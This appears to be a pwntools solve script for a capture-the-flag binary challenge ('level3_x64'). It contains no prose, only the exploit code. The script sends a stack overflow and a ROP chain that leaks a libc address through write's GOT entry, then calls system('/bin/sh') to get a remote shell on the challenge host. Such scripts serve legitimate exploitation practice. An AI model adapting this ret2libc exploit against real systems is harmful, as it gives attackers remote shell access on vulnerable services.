from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('level3_x64')
io = remote('node4.buuoj.cn', 26592)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('level3_x64')
main = elf.sym['main']
write_got = elf.got['write']
write_plt = elf.plt['write']
pop_rdi_ret = 0x4006b3
pop_rsi_r15_ret = 0x4006b1

payload = cyclic(0x88) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) +p64(write_plt) + p64(main)
io.sendline(payload)
io.recvline()
libc_base = u64(io.recvn(8)) - libc.sym['write']
log.success('libc_base: ' + hex(libc_base))
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0x88) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
io.sendline(payload)
io.interactive()
